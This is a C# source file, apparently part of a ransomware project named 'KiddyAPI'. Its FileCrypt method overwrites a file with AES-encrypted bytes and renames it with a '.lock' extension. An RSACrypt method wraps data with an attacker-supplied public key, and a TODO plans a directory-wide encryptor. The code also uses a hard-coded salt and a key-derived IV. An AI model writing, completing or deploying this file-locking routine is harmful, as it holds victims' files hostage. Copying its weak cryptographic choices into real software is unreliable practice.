using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace KiddyAPI.Crypt
{
    class Encrypt
    {
        private static byte[] AES_Crypt(byte[] bytesToEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            MemoryStream ms = new MemoryStream();
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;

            var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Mode = CipherMode.CBC;
            CryptoStream cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write);
            cs.Write(bytesToEncrypted, 0, bytesToEncrypted.Length);
            cs.Close();
            AES.Clear();
            encryptedBytes = ms.ToArray();
            ms.Close();
            return encryptedBytes;
        }
        /// <summary>
        /// AES256
        /// </summary>
        public static void FileCrypt(string file, string password)
        {
            byte[] bytesToBeEcnrypted = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
            byte[] bytesEncrypted = AES_Crypt(bytesToBeEcnrypted, passwordBytes);
            File.WriteAllBytes(file, bytesEncrypted);
            File.Move(file, file + ".lock");

        }
        public static string RSACrypt(string publicKey, string plain) /// shitty method. Need better
        {
            var rsa = new RSACryptoServiceProvider(2048);
            rsa.PersistKeyInCsp = false;
            rsa.FromXmlString(publicKey);
            return Convert.ToBase64String(rsa.Encrypt(Encoding.UTF8.GetBytes(plain), false));
        }

        ///////////////////////////////
        ///TODO:Directory Encryptor
        ///////////////////////////////
    }
}
